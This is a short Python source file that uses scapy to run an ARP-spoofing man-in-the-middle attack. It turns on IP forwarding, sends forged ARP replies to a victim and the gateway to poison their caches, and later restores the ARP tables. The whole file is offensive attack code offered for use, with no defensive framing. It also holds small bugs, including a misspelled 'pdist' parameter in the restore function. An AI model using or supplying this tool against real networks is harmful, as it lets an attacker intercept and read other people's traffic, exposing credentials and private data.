import scapy.all as scapy
import sys, os, time, argparse

scapy.conf.verb = 0 # no cool messages
broadcast = "ff:ff:ff:ff:ff:ff"

def set_ipfwd(x=1):
	op = os.system("echo %i > /proc/sys/net/ipv4/ip_forward" % x)
def get_mac(ip, iface):
	ans, unasn = scapy.srp(scapy.Ether(dst=broadcast)/scapy.ARP(pdst=ip), timeout=2, iface=iface, inter=0.1)
	for snd, recv in ans:
		return recv.sprintf(r"%Ether.src%")

def reARP(victim, gateway, iface):
	vmac = get_mac(victim, iface)
	gmac = get_mac(gateway, iface)
	scapy.send(scapy.ARP(op=2, pdist=gateway, psrc=victim, 
		hwdst=broadcast, hwsrc=vmac), count=7)
	
	scapy.send(scapy.ARP(op=2, pdst=victim, psrc=gateway,
		hwdst=broadcast, hwsrc=gmac), count=7)

def trick(victim, gateway, iface):
	scapy.send(scapy.ARP(op=2, pdst=victim, psrc=gateway,
		hwdst=get_mac(victim, iface)))
	scapy.send(scapy.ARP(op=2, pdst=gateway, psrc=victim,
		hwdst=get_mac(gateway, iface)))


def arpspoof(victim, gateway, iface):
	set_ipfwd()
	trick(victim, gateway, iface)
	cont = input("* Poisoning targets, press [Enter] to stop")
	reARP(victim, gateway, iface)
	set_ipfwd(x=0)